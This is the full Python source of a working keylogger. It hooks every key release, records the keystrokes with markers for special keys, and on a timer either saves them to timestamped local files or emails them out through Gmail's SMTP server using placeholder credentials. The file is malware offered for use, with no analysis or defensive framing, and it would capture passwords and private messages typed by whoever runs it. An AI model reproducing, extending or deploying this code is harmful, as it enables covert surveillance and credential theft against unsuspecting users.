import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
from threading import Timer
from datetime import datetime
import sys

emailAddress = "YOUR EMAIL ADDRESS"
password = "YOUR PASSWORD"

class Keylogger:
    def __init__(self, interval, reportMethod="local"):
        self.interval = interval
        self.reportMethod = reportMethod
        self.log = ""
        self.startDT = datetime.now()
        self.endDT = datetime.now()

    def callbackOnRelease(self, event):
        name = event.name
        if len(name) > 1:
            if name == 'space':
                name = " "
            elif name == 'enter':
                name = "[ENTER]\n"
            elif name == 'decimal':
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def updateFilename(self):
        startStr = str(self.startDT)[:-7].replace(" ", "-").replace(":", "")
        endStr= str(self.endDT)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{startStr}_{endStr}"

    def reportToFile(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"=> Logged {self.filename}.txt")

    
    def sendMail(self, email, password, message):
        # Connection to the SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # Connect to the SMTP server as TLS (Transport Layer Security) mode
        server.starttls()
        # Login to email account
        server.login(email, password)
        # Send message
        server.sendmail(email, email, message)
        # Terminate session
        server.quit()

    def report(self):
        if self.log:
            self.endDT = datetime.now()
            self.updateFilename()
            if self.reportMethod == "email":
                self.sendMail(emailAddress, password, self.log)
            elif self.reportMethod == "local":
                self.reportToFile()
            self.startDT = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()


    def startLog(self):
        self.startDT = datetime.now()
        keyboard.on_release(callback=self.callbackOnRelease)
        self.report()
        print(f"{str(datetime.now())[:-7]} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


sendReportFreq = 60
repMethod = "local"
if len(sys.argv) == 2:
    sendReportFreq = int(sys.argv[1])
if len(sys.argv) == 3:
    sendReportFreq = int(sys.argv[1])
    repMethod = str(sys.argv[2])

keylogger = Keylogger(interval=sendReportFreq, reportMethod=repMethod)
keylogger.startLog()
